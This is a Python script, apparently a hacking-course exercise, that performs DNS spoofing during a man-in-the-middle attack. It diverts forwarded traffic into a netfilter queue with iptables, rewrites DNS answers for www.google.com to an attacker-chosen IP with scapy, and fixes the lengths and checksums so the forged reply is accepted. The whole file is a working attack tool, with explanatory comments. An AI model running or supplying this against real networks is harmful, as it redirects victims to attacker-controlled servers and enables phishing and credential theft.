#!/usr/bin/env python

# Here we want to modify requests, but scapy cannot be used to intercept or drop packets
# Thus, here we receive a req., then create a copy and modify the request and send both to the target
# Target receives 2 requests but responds to the request it receives first.
# Thus we use a QUEUE to trap packets i.e. pause them so that we can modify and send 1 request only
# Same method used for responses.. trap the response, modify and send 1 response.
import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse


# We have 3 options to implement DNS spoofing
# 1. in the hacker machine install a DNS server like a real one to redirect requests to whatever IP you want
# 2. Craft a DNS response in the hacker computer and give them malicious IP instead of actual IP
#     For this we need extensive knowledge of DNS server and network layers
# 3. Forward the req to actual DNS and modify only the IP in the response received form the actual DNS server
#     This is what we'll do

def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--redirect", dest="redirect_ip", help="Enter the ip to which you want to redirect the user.")
    options = parser.parse_args()
    return options


def process_packet(packet):
    # print(packet) # shows only protocol and no. of bytes. To see payload,
    # print(packet.get_payload()) # Still cant see much useful info - just the RAW part is readable
    # So we convert it into a scapy IP packet - wrapping the payload with scapy.IP layer
    scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packet.show())
    # print("INSIDE")
    # scapy.DNSRR(ResourceRecord) for response and scapy.DNSQR(QuestionRecord) for request
    if scapy_packet.haslayer(scapy.DNSRR):
        print("HAS DNSRR")
        # print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        print(qname)
        # Only if the request is for bing.com then spoof
        if "www.google.com" in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.redirect_ip)
            scapy_packet[scapy.DNS].an = answer
            print("end1 after set an")
            # Now, our answer contains just 1 entry, actual has 4 based on the value "ancount", so we modify that too
            scapy_packet[scapy.DNS].ancount = 1
            print("end2 after set ancount")
            # Now, the len and chksum values in IP and UDP layers can corrupt our packet since we've manually changed some values
            # So we remove those fields and SCAPY WILL AUTOMATICALLY recalculate them based on our values
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            print("end after delete")
            # To send our modified packet instead of the orig. packet
            # str is used cuz the original packet initially is displayed as str of random chars
            packet.set_payload(str(scapy_packet))

    packet.accept()

# For MITM, we modify the FORWARD chain
subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])

print("[+] Successfully modified iptables...")

options = get_argument()
print("got arg")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
print("after bind")
try:
    print("in try")
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("[+] Successfully flushed iptables...")
